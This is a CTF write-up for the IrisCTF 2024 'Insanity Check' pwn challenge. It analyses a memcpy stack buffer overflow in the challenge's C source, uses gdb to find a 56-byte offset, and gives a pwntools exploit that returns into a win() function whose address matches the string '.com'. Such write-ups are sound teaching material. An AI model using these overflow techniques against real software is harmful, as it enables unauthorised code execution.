---
title: Insanity Check
author: capang
date: 2024-01-09 09:30:00 +0800
categories: [Writeups, PWN]
tags: [irisctf 2024]
math: true
mermaid: true
---

# Overview

The unsafe `memcpy` usage in the `main()` function causes Buffer Overflow which causes us being able to overwrite the RSP and return to the targeted address `win()` function. However, our input will only causes Buffer Overflow but the predefined `suffix` in the `main()` function will be populated in RSP. Turns out the targeted function `win()` address is the same value as the string `.com`    

# File Analysis

## Security checking

```bash
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c2d6acffbfd9fd36c0a8089feffe3ce53f3eabba, for GNU/Linux 4.4.0, not stripped
```

```python
checksec --file vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x40000000)
```

### Key Points

- possible buffer overflow
- function address not randomized

## Checking the source code

```C 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void rstrip(char* buf, const size_t len) {
    for (int i = len - 1; i >= 0; i--)
        if (buf[i] == '\n') {
            buf[i] = '\0';
            break;
        }
}

const char suffix[] = "! Welcome to IrisCTF2024. If you have any questions you can contact us at test@example.com\0\0\0\0";

int main() {
    char message[128];
    char name[64];
    fgets(name, 64, stdin);
    rstrip(name, 64);

    strcpy(message, "Hi there, ");
    strcpy(message + strlen(message), name);
    memcpy(message + strlen(message), suffix, sizeof(suffix));

    printf("%s\n", message);
}

__attribute__((section(".flag")))
void win() {
    __asm__("pop %rdi");
    system("cat /flag");
}
```

### Target function

Found a target function which is `win()`

```
0x000000006d6f632e  win
```

### Vulnerabilities

The user needs to input max 64 Characters
However unsafe memcpy usage in the `main()` function resulting in buffer overflow

```C
strcpy(message, "Hi there, ");
strcpy(message + strlen(message), name);
memcpy(message + strlen(message), suffix, sizeof(suffix));
```

```
len("Hi there, ") = 10
len(input) = 64 max
len(suffix) = 94
total = 160
```

Buffer overflow can occur

## Exploitation

`0x000000006d6f632e  win` is the address of the win() function
`unhex(0x000000006d6f632e) = moc.`
In the suffix there is '.com' which we can overwrite the RSP with it

### Finding the offsets

To find the offsets we need to use debugger, in my case we use gdb-pwndbg

First we need to input max number of char

```python
*RSP  0x7fffffffdce8 ◂— 'example.com' or 0x2e656c706d617865
```

RSP were populated with 'example.com'. To have only .com in the RSP, we need to substract 'example'. Which is 64 - 7 = 57

```python
Invalid address 0x6d6f632e65 -> e.com
```

Opps, we need another more. thus the offsets is 64-8 = 56. We can craft our payload using PWNTOOLS or manually.

```exploit.py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# libc = elf.libc
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

payload = flat(
    b'A' * 56,
    )


io.sendline(payload)
print(io.recv())
io.interactive()
```

![Flag Picture](/assets/img/writeups/flag-insanity-check.png)

irisctf{c0nv3n13nt_symb0l_pl4cem3nt}


